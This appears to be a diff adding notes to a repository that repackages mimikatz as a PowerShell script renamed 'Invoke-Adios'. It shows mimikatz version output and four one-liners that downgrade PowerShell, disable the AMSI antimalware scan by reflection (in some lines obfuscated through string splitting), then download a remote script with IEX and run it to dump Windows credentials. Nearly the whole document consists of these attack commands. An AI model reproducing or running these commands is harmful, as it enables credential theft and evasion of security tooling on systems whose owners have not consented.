@@ -1,0 +1,26 @@
+PS C:\Users\analyticsearch> Invoke-Adios -Command version
+
+  .#####.   mimikatz 2.1.1 (x64) built on Aug 15 2018 13:42:01
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Vegas Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # version
+
+mimikatz 2.1.1 (arch x64)
+Windows NT 6.3 build 9600 (arch x64)
+msvc 180021005 1
+
+--------------------------------------------------------------------------------------------------------------------
+
+powershell -version 2 "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/PowershellMimiKatz/master/Invoke-Adios.ps1');Invoke-Adios -AdiosCreds
+
+powershell -version 2 -Command [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/PowershellMimiKatz/master/Invoke-Adios.ps1');Invoke-Adios -AdiosCreds
+
+powershell -version 2 -Command [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/PowershellMimiKatz/master/Invoke-Adios.ps1');IEX ('if(0){{{0}}}' -f $(0 -as [char]) + 'Invoke-'+'Adios -AdiosCreds')
+
+powershell -version 2 -Command IEX ('if(0){{{0}}}' -f $(0 -as [char]) + '[Ref].Assembly.GetType("System.Management.Automation.Amsi'+'Utils").GetField("amsi'+'InitFailed","NonPublic,Static").SetValue($null,$true)');IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/PowershellMimiKatz/master/Invoke-Adios.ps1');IEX ('if(0){{{0}}}' -f $(0 -as [char]) + 'Invoke-'+'Adios -AdiosCreds')
+
+--------------------------------------------------------------------------------------------------------------------
